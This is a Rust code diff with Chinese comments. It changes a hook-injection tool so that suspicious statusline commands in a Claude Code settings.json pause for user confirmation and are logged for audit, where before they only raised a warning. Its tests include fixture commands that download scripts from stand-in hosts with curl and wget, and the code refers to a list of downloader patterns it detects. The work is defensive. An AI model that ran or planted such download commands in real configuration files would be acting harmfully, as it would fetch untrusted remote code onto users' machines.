@@ -111,12 +111,13 @@ fn unwrap_wrapped_statusline(command: &str) -> Option<String> {
     unwrapped.then_some(current)
 }
 
-// ── statusline 原命令可疑模式审查（SEC-12） ──
+// ── statusline 原命令可疑模式审查（SEC-12，CP-043 起命中即暂停） ──
 //
 // 桥接脚本透传执行用户原 statusline 命令（slterm-statusline.js argv[2]），若
 // settings.json 的 statusLine 被篡改则形成命令注入面。审查 = 检测可疑模式
-// （下载器 curl/wget、任意执行 Invoke-Expression 系），命中 tracing::warn! 告警——
-// 仅记录不阻断（命令来自用户自身配置，信任边界登记在 S19 文档同步），
+// （下载器 curl/wget、任意执行 Invoke-Expression 系）。CP-043 起命中不再静默放行：
+// 注入路径返回 PendingConfirmation 待用户确认（settings.json 零写盘），确认后经
+// confirm 路径二次注入；启动重注入路径命中即跳过。审计进 target: "audit" 通道。
 // 可测部分抽纯函数（suspicious_statusline_pattern）。
 
 /// 可疑模式表：(小写模式串, 展示名)——下载器 + PowerShell 任意执行系
@@ -155,14 +156,19 @@ fn suspicious_statusline_pattern(command: &str) -> Option<&'static str> {
         .map(|(_, name)| *name)
 }
 
-/// 注入/重注入 statusline 时对原命令做可疑模式审查（SEC-12 调用点）——
-/// 命中 tracing::warn! 告警，仅记录不阻断（信任边界：命令来自用户自身配置）
-fn warn_if_suspicious_statusline(command: &str) {
-    if let Some(pattern) = suspicious_statusline_pattern(command) {
+/// statusline 原命令可疑模式审查（SEC-12 调用点，CP-043）——
+/// 命中进审计通道（target "audit"）并返回命中模式；调用方据此暂停注入，
+/// 待前端展示命令原文、用户确认后经 confirm 路径完成注入。
+/// 不再静默放行（旧语义「仅记录不阻断」作废）。
+fn audit_suspicious_statusline(command: &str) -> Option<&'static str> {
+    let pattern = suspicious_statusline_pattern(command);
+    if let Some(p) = pattern {
         tracing::warn!(
-            "statusline 原命令命中可疑模式 {pattern}（SEC-12 审查，仅记录不阻断）: {command}"
+            target: "audit",
+            "statusline 原命令命中可疑模式 {p}（SEC-12 审查，暂停注入待用户确认）: {command}"
         );
     }
+    pattern
 }
 
 /// 构造桥接 statusLine 配置（command = node 桥接脚本 + 原命令 argv——桥接脚本透传执行原命令）
@@ -359,9 +365,12 @@ fn inject_matchers(hooks: &mut serde_json::Map<String, Value>, script_abs_path: 
 /// 流程：确保脚本目录存在 → 原子写 reporter + statusline 桥接脚本 → 读 settings.json →
 /// 移除旧 slterm 段 → 追加 10 事件 matcher → statusLine 备份 + 写桥接配置 → 原子写回。
 /// JSON 非法时返回 AppError 且不改动文件。
+/// CP-043：statusLine 原命令命中可疑模式（skip_suspicious_review=false 时）→
+/// 返回 PendingConfirmation + 命令原文，settings.json 零写盘；确认路径（true）跳过审查。
 pub(crate) fn inject_impl(
     settings_path: &std::path::Path,
     script_dir: &std::path::Path,
+    skip_suspicious_review: bool, // CP-043：确认注入路径为 true——命令原文已展示并经用户确认
 ) -> Result<AgentHookInjectionStatus, AppError> {
     // 1. 确保脚本目录存在并原子写 reporter + statusline 桥接脚本
     //    （覆盖写——升级场景须刷新磁盘脚本到新模板版本；reconcile 才是「缺失才补」）
@@ -450,9 +459,19 @@ pub(crate) fn inject_impl(
             },
             None => (None, None),
         };
-        // SEC-12：对透传执行的原命令做可疑模式审查（命中 warn，仅记录不阻断）
-        if let Some(original) = &original_command {
-            warn_if_suspicious_statusline(original);
+        // CP-043：命中可疑模式 → settings.json 零写盘（matcher 与桥接均不落盘——
+        // 第 7 步原子写回尚未执行），返回待确认 + 命令原文；脚本已落盘无害
+        // （无 matcher 引用即惰性）。确认路径（skip_suspicious_review=true）跳过审查。
+        if !skip_suspicious_review {
+            if let Some(original) = &original_command {
+                if audit_suspicious_statusline(original).is_some() {
+                    return Ok(AgentHookInjectionStatus {
+                        status: AgentInjectionStatus::PendingConfirmation,
+                        version: None,
+                        suspicious_command: Some(original.clone()),
+                    });
+                }
+            }
         }
         if original_command.is_some() {
             if let Some(backup_path) = backup_path_from_script_dir(script_dir) {
@@ -476,6 +495,7 @@ pub(crate) fn inject_impl(
     Ok(AgentHookInjectionStatus {
         status: AgentInjectionStatus::Injected,
         version: Some(template_version()),
+        suspicious_command: None,
     })
 }
 
@@ -612,9 +632,10 @@ pub(crate) fn reinject_statusline_impl(
         .and_then(|c| c.as_str())
         .map(|c| unwrap_wrapped_statusline(c).unwrap_or_else(|| c.to_string()))
         .unwrap_or_default();
-    // SEC-12：重注入同样对透传执行的原命令做可疑模式审查（命中 warn，仅记录不阻断）
-    if !original_command.is_empty() {
-        warn_if_suspicious_statusline(&original_command);
+    // CP-043：启动路径无用户交互——命中可疑模式不重注入（尊重用户现状配置
+    // 不动），审计留痕；用户须进设置页手动注入走确认流
+    if !original_command.is_empty() && audit_suspicious_statusline(&original_command).is_some() {
+        return Ok(());
     }
     if let Some(root) = settings.as_object_mut() {
         root.insert(
@@ -804,6 +825,7 @@ pub(crate) fn injection_status_impl(
         return AgentHookInjectionStatus {
             status: AgentInjectionStatus::NotInjected,
             version: None,
+            suspicious_command: None,
         };
     }
 
@@ -830,6 +852,7 @@ pub(crate) fn injection_status_impl(
         return AgentHookInjectionStatus {
             status: AgentInjectionStatus::NotInjected,
             version: None,
+            suspicious_command: None,
         };
     }
 
@@ -842,6 +865,7 @@ pub(crate) fn injection_status_impl(
         return AgentHookInjectionStatus {
             status: AgentInjectionStatus::Outdated,
             version: disk_ver,
+            suspicious_command: None,
         };
     }
 
@@ -856,12 +880,14 @@ pub(crate) fn injection_status_impl(
         return AgentHookInjectionStatus {
             status: AgentInjectionStatus::Outdated,
             version: disk_ver,
+            suspicious_command: None,
         };
     }
 
     AgentHookInjectionStatus {
         status: AgentInjectionStatus::Injected,
         version: disk_ver,
+        suspicious_command: None,
     }
 }
 
@@ -1033,7 +1059,7 @@ mod inject_tests {
         let script_path = script_dir.join("slterm-hook-reporter.js");
         std::fs::create_dir_all(&script_dir).unwrap();
         // 注入正常状态（脚本 = 模板 + settings 含 matcher + statusLine 桥接）→ Injected
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let s = injection_status_impl(&script_path, &settings_path);
         assert_eq!(s.status, AgentInjectionStatus::Injected);
 
@@ -1061,7 +1087,7 @@ mod inject_tests {
         // 磁盘脚本完全替换（无 SCRIPT_VERSION 行）→ 哈希不一致 → Outdated
         let (_dir, settings_path, script_dir) = make_inject_env();
         let script_path = script_dir.join("slterm-hook-reporter.js");
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         std::fs::write(&script_path, "// malicious replacement\n").unwrap();
         let s = injection_status_impl(&script_path, &settings_path);
         assert_eq!(s.status, AgentInjectionStatus::Outdated);
@@ -1366,7 +1392,7 @@ mod inject_tests {
     #[test]
     fn inject_impl_basic() {
         let (_dir, settings_path, script_dir) = make_inject_env();
-        let status = inject_impl(&settings_path, &script_dir).unwrap();
+        let status = inject_impl(&settings_path, &script_dir, false).unwrap();
         assert_eq!(status.status, AgentInjectionStatus::Injected);
         assert_eq!(status.version, Some(template_version()));
         // 脚本已落盘且内容为内嵌模板
@@ -1390,7 +1416,7 @@ mod inject_tests {
             r#"{"permissions":{"allow":["bash"]},"env":{"K":"v"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let settings = assert_injected_settings(&settings_path);
         assert_eq!(
             settings["permissions"]["allow"][0], "bash",
@@ -1403,8 +1429,8 @@ mod inject_tests {
     fn inject_impl_idempotent() {
         // 二次注入不产生重复 matcher（每事件仍恰好 1 个）
         let (_dir, settings_path, script_dir) = make_inject_env();
-        inject_impl(&settings_path, &script_dir).unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let settings = assert_injected_settings(&settings_path);
         for &event in HOOK_EVENTS {
             let arr = settings["hooks"][event].as_array().unwrap();
@@ -1419,7 +1445,7 @@ mod inject_tests {
         std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
         let original = b"{ this is not valid json !!".to_vec();
         std::fs::write(&settings_path, &original).unwrap();
-        let err = inject_impl(&settings_path, &script_dir).unwrap_err();
+        let err = inject_impl(&settings_path, &script_dir, false).unwrap_err();
         assert!(
             err.to_string().contains("格式错误"),
             "错误信息应说明格式错误: {err}"
@@ -1437,7 +1463,7 @@ mod inject_tests {
         let (_dir, settings_path, script_dir) = make_inject_env();
         std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
         std::fs::write(&settings_path, "[1,2,3]").unwrap();
-        assert!(inject_impl(&settings_path, &script_dir).is_err());
+        assert!(inject_impl(&settings_path, &script_dir, false).is_err());
         assert_eq!(
             std::fs::read_to_string(&settings_path).unwrap(),
             "[1,2,3]",
@@ -1451,7 +1477,7 @@ mod inject_tests {
         let (_dir, settings_path, script_dir) = make_inject_env();
         std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
         std::fs::write(&settings_path, r#"{"hooks": [1,2]}"#).unwrap();
-        assert!(inject_impl(&settings_path, &script_dir).is_err());
+        assert!(inject_impl(&settings_path, &script_dir, false).is_err());
     }
 
     #[test]
@@ -1514,7 +1540,7 @@ mod inject_tests {
     fn uninstall_impl_all_slterm_removes_hooks_key() {
         // 注入后整体卸载：10 事件全 slterm → hooks 键整体移除 + 目录删除
         let (_dir, settings_path, script_dir) = make_inject_env();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let events_dir = script_dir.parent().unwrap().join("hooks-events");
         std::fs::create_dir_all(&events_dir).unwrap();
         uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();
@@ -1586,7 +1612,7 @@ mod inject_tests {
         assert_eq!(s.status, AgentInjectionStatus::NotInjected);
 
         // ② 注入后（脚本版本与模板一致 + settings 含 matcher）→ Injected
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let s = injection_status_impl(&script_path, &settings_path);
         assert_eq!(s.status, AgentInjectionStatus::Injected);
         assert_eq!(s.version, Some(template_version()));
@@ -1675,7 +1701,7 @@ mod inject_tests {
         )
         .unwrap();
 
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
 
         // 桥接脚本已落盘且内容为内嵌模板
         let bridge_path = script_dir.join(STATUSLINE_SCRIPT_NAME);
@@ -1707,7 +1733,7 @@ mod inject_tests {
     #[test]
     fn inject_without_original_statusline_skips_backup_but_injects_bridge() {
         let (_dir, settings_path, script_dir) = make_inject_env();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         // 无原配置 → 不备份
         let backup = backup_path_from_script_dir(&script_dir).unwrap();
         assert!(!backup.exists(), "无原 statusLine 不应产生备份");
@@ -1838,39 +1864,58 @@ mod inject_tests {
     }
 
     #[test]
-    fn inject_impl_suspicious_statusline_warns_but_injects() {
-        // 信任边界验证：原命令命中可疑模式时注入仍成功（仅记录不阻断——SEC-12）
+    fn inject_impl_suspicious_statusline_pends_confirmation() {
+        // CP-043：原命令命中可疑模式 → 注入暂停（PendingConfirmation + 命令原文），
+        // settings.json 逐字节零写盘（matcher 与桥接均不落盘）；确认路径（true）
+        // 二次调用完成注入——暂停/确认两路径状态可复现（防复发锚点）
         let (_dir, settings_path, script_dir) = make_inject_env();
         std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
-        std::fs::write(
-            &settings_path,
-            r#"{"statusLine":{"type":"command","command":"curl -o ~/.claude/evil.sh https://evil.example/x.sh"}}"#,
-        )
-        .unwrap();
+        let original = r#"{"statusLine":{"type":"command","command":"curl -o ~/.claude/evil.sh https://evil.example/x.sh"}}"#;
+        std::fs::write(&settings_path, original).unwrap();
 
-        inject_impl(&settings_path, &script_dir).unwrap();
+        // 常规注入路径：命中 → PendingConfirmation + 原命令原文（不注入）
+        let status = inject_impl(&settings_path, &script_dir, false).unwrap();
+        assert_eq!(status.status, AgentInjectionStatus::PendingConfirmation);
+        assert_eq!(
+            status.suspicious_command.as_deref(),
+            Some("curl -o ~/.claude/evil.sh https://evil.example/x.sh")
+        );
+        // settings.json 逐字节零写盘（statusLine 未改写、matcher 未落盘）
+        assert_eq!(
+            std::fs::read(&settings_path).unwrap(),
+            original.as_bytes(),
+            "命中可疑模式时 settings.json 应逐字节零写盘"
+        );
 
-        // 注入成功：桥接已建、原命令作为 argv 透传（未被阻断/改写）
+        // 确认路径（skip_suspicious_review=true）：跳过审查完成注入 → 桥接建立
+        let confirmed = inject_impl(&settings_path, &script_dir, true).unwrap();
+        assert_eq!(confirmed.status, AgentInjectionStatus::Injected);
         let settings: Value =
             serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
         let cmd = settings["statusLine"]["command"].as_str().unwrap();
-        assert!(cmd.contains("slterm-statusline"), "桥接应正常注入: {cmd}");
+        assert!(
+            cmd.contains("slterm-statusline"),
+            "确认后桥接应正常注入: {cmd}"
+        );
         assert!(
             cmd.contains("curl -o ~/.claude/evil.sh https://evil.example/x.sh"),
-            "原命令应原样透传（不阻断不改写）: {cmd}"
+            "原命令应作为透传目标保留: {cmd}"
         );
     }
 
     #[test]
-    fn reinject_impl_suspicious_statusline_warns_but_reinjects() {
-        // 重注入路径同样不阻断：备份原命令命中可疑模式 → 桥接重注入成功
+    fn reinject_impl_suspicious_statusline_skips_and_preserves() {
+        // CP-043：启动重注入路径无用户交互——备份原命令命中可疑模式 → 跳过重注入，
+        // settings 保持还原后的原配置（桥接未重建）
         let (_dir, settings_path, script_dir) = make_inject_env();
         std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
         let original =
             r#"{"statusLine":{"type":"command","command":"wget -O /tmp/x https://evil/x"}}"#;
         std::fs::write(&settings_path, original).unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        // 确认路径建立桥接 + 备份（常规路径遇可疑命令会暂停，无用户交互可用）
+        inject_impl(&settings_path, &script_dir, true).unwrap();
         let backup = backup_path_from_script_dir(&script_dir).unwrap();
+        // 关闭恢复 → statusLine 还原为备份原配置（重注入触发条件就绪）
         restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
 
         reinject_statusline_impl(
@@ -1880,14 +1925,61 @@ mod inject_tests {
         )
         .unwrap();
 
+        // 命中可疑模式 → 跳过：settings 保持还原后的原配置（桥接未重建）
         let settings: Value =
             serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
         let cmd = settings["statusLine"]["command"].as_str().unwrap();
-        assert!(cmd.contains("slterm-statusline"), "重注入桥接应成功: {cmd}");
+        assert!(
+            !cmd.contains("slterm-statusline"),
+            "可疑原命令不应被重注入（桥接未重建）: {cmd}"
+        );
         assert!(
             cmd.contains("wget -O /tmp/x https://evil/x"),
-            "重注入透传原命令应原样（不阻断）: {cmd}"
+            "用户原配置应原样保留: {cmd}"
         );
+    }
+
+    #[test]
+    fn inject_impl_clean_statusline_unaffected() {
+        // CP-043 防回归锚点：原命令不命中可疑模式 → 一步完成注入（白名单路径零摩擦）；
+        // 返回 Injected 且 suspicious_command 序列化缺键（skip_serializing_if 契约）
+        let (_dir, settings_path, script_dir) = make_inject_env();
+        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
+        std::fs::write(
+            &settings_path,
+            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
+        )
+        .unwrap();
+
+        let status = inject_impl(&settings_path, &script_dir, false).unwrap();
+        assert_eq!(status.status, AgentInjectionStatus::Injected);
+        assert_eq!(status.version, Some(template_version()));
+        // 非待确认态：suspicious_command 序列化缺键（键集合 = status/version 两键）
+        let json = serde_json::to_string(&status).unwrap();
+        let v: serde_json::Value = serde_json::from_str(&json).unwrap();
+        let mut keys: Vec<&str> = v.as_object().unwrap().keys().map(String::as_str).collect();
+        keys.sort_unstable();
+        assert_eq!(keys, ["status", "version"]);
+        let settings: Value =
+            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
+        let cmd = settings["statusLine"]["command"].as_str().unwrap();
+        assert!(cmd.contains("slterm-statusline"), "桥接应正常注入: {cmd}");
+    }
+
+    #[test]
+    #[tracing_test::traced_test]
+    fn inject_suspicious_statusline_emits_audit_log() {
+        // TQ-COV-05（SEC-17 同款通道）：命中可疑模式必须留审计日志（target "audit"）——
+        // tracing-test 捕获断言，锁审查闸命中即留痕
+        let (_dir, settings_path, script_dir) = make_inject_env();
+        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
+        std::fs::write(
+            &settings_path,
+            r#"{"statusLine":{"type":"command","command":"curl -o ~/.claude/evil.sh https://evil.example/x.sh"}}"#,
+        )
+        .unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
+        assert!(logs_contain("statusline 原命令命中可疑模式"));
     }
 
     #[test]
@@ -1901,7 +1993,7 @@ mod inject_tests {
         )
         .unwrap();
 
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
 
         // 桥接单层：command 含内层命令、不含 reporter
         let settings: Value =
@@ -1966,7 +2058,7 @@ mod inject_tests {
         )
         .unwrap();
 
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
 
         let settings: Value =
             serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
@@ -2032,10 +2124,10 @@ mod inject_tests {
             r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let after_first: Value =
             serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let after_second: Value =
             serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
         assert_eq!(
@@ -2053,7 +2145,7 @@ mod inject_tests {
             r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let events_dir = script_dir.parent().unwrap().join("hooks-events");
         std::fs::create_dir_all(&events_dir).unwrap();
 
@@ -2074,7 +2166,7 @@ mod inject_tests {
     fn uninstall_without_backup_removes_bridge_statusline_key() {
         // 注入时无原配置 → 无备份；卸载 → 移除 statusLine 键（用户原本无）
         let (_dir, settings_path, script_dir) = make_inject_env();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let events_dir = script_dir.parent().unwrap().join("hooks-events");
         std::fs::create_dir_all(&events_dir).unwrap();
         uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();
@@ -2097,7 +2189,7 @@ mod inject_tests {
             r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let backup = backup_path_from_script_dir(&script_dir).unwrap();
 
         restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
@@ -2149,7 +2241,7 @@ mod inject_tests {
             r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let backup = backup_path_from_script_dir(&script_dir).unwrap();
         // 模拟关闭恢复后的状态
         restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
@@ -2182,7 +2274,7 @@ mod inject_tests {
             r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let backup = backup_path_from_script_dir(&script_dir).unwrap();
         restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
         // 用户在其他终端改过 statusLine
@@ -2248,7 +2340,7 @@ mod inject_tests {
     fn ensure_scripts_matchers_present_scripts_missing_writes_both() {
         // 9-6 防复发主场景：注入后 hooks 目录被外部删除（matcher 残留）→ 对账补写两脚本
         let (_dir, settings_path, script_dir) = make_inject_env();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let settings_before = std::fs::read_to_string(&settings_path).unwrap();
         std::fs::remove_dir_all(&script_dir).unwrap(); // 模拟外部删除
         let wrote = ensure_scripts_impl(Some(&settings_path), None, &script_dir).unwrap();
@@ -2298,7 +2390,7 @@ mod inject_tests {
     fn ensure_scripts_existing_files_not_overwritten() {
         // 已存在脚本不被覆盖（保留 SEC-13 审计路径：磁盘脚本被替换 → Outdated 提示）
         let (_dir, settings_path, script_dir) = make_inject_env();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let custom = "// 用户自定义替换内容\n";
         std::fs::write(script_dir.join(REPORTER_SCRIPT_NAME), custom).unwrap();
         std::fs::write(script_dir.join(STATUSLINE_SCRIPT_NAME), custom).unwrap();
@@ -2351,7 +2443,7 @@ mod inject_tests {
             r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
         )
         .unwrap();
-        inject_impl(&settings_path, &script_dir).unwrap();
+        inject_impl(&settings_path, &script_dir, false).unwrap();
         let backup = backup_path_from_script_dir(&script_dir).unwrap();
         restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
 
